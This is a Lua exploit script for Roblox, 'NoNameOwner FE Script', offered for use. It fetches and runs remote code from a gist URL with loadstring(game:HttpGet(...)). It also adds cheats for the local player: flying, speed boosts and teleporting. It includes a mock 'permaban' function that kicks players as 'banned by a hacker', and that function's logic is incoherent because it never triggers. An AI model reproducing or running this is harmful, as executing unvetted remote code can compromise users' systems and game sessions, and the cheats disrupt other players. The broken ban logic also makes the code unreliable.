-- NoNameOwner FE Script
local Players = game:GetService("Players")
local bannedUsers = {}

local function permaban(player)
    if not bannedUsers[player.UserId] then
        bannedUsers[player.UserId] = true
        player:Kick("You are permabanned by a hacker")
    end
end

local function onPlayerAdded(player)
    -- Check if player is an alt account (simple check, can be customized)
    if bannedUsers[player.UserId] then
        permaban(player)
        print("NoNameOwner is now executed.")
    end
end

Players.PlayerAdded:Connect(onPlayerAdded)

-- Load external script
local success, err = pcall(function()
    print("NoNameOwner is now executed.")
    loadstring(game:HttpGet("https://gist.github.com/someunknowndude/38cecea5be9d75cb743eac8b1eaf6758/raw"))()
end)

if not success then
    print("ERROR: NoNameOwner is already running")
end

-- Quirky commands
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local localPlayer = Players.LocalPlayer
local character = localPlayer.Character or localPlayer.CharacterAdded:Wait()
local humanoid = character:WaitForChild("Humanoid")
local rootPart = character:WaitForChild("HumanoidRootPart")

local flyEnabled = false
local flySpeed = 50
local flyFling = false
local shiftLockEnabled = false
local speed = 16

local function toggleFly()
    flyEnabled = not flyEnabled
    if flyEnabled then
        local bodyVelocity = Instance.new("BodyVelocity", rootPart)
        bodyVelocity.MaxForce = Vector3.new(1e5, 1e5, 1e5)
        bodyVelocity.Velocity = Vector3.new(0,0,0)
        local function updateFly()
            while flyEnabled do
                local moveDirection = Vector3.new()
                if UserInputService:IsKeyDown(Enum.KeyCode.W) then
                    moveDirection = moveDirection + rootPart.CFrame.LookVector
                end
                if UserInputService:IsKeyDown(Enum.KeyCode.S) then
                    moveDirection = moveDirection - rootPart.CFrame.LookVector
                end
                if UserInputService:IsKeyDown(Enum.KeyCode.A) then
                    moveDirection = moveDirection - rootPart.CFrame.RightVector
                end
                if UserInputService:IsKeyDown(Enum.KeyCode.D) then
                    moveDirection = moveDirection + rootPart.CFrame.RightVector
                end
                bodyVelocity.Velocity = moveDirection * flySpeed
                wait()
            end
        end
        coroutine.wrap(updateFly)()
    else
        for _, v in pairs(rootPart:GetChildren()) do
            if v:IsA("BodyVelocity") then v:Destroy() end
        end
    end
end

local function toggleShiftLock()
    shiftLockEnabled = not shiftLockEnabled
    localPlayer.CameraMaxZoomDistance = shiftLockEnabled and 0.5 or 100
    localPlayer.CameraMinZoomDistance = shiftLockEnabled and 0.5 or 0.5
end

local function changeSpeed(newSpeed)
    speed = newSpeed
    humanoid.WalkSpeed = speed
end

local function toggleFlyFling()
    flyFling = not flyFling
    if flyFling then
        -- Implement fling logic if desired
        print("FlyFling enabled.")
    else
        print("FlyFling disabled.")
    end
end

local function gotoPosition(pos)
    rootPart.CFrame = CFrame.new(pos)
end

local function loopGoto(pos, delay)
    while true do
        gotoPosition(pos)
        wait(delay)
    end
end

-- Example Usage
toggleFly()
changeSpeed(50)
toggleShiftLock()
toggleFlyFling()
gotoPosition(Vector3.new(0, 10, 0))
-- To run loop goto
-- coroutine.wrap(function() loopGoto(Vector3.new(0,10,0), 5) end)()
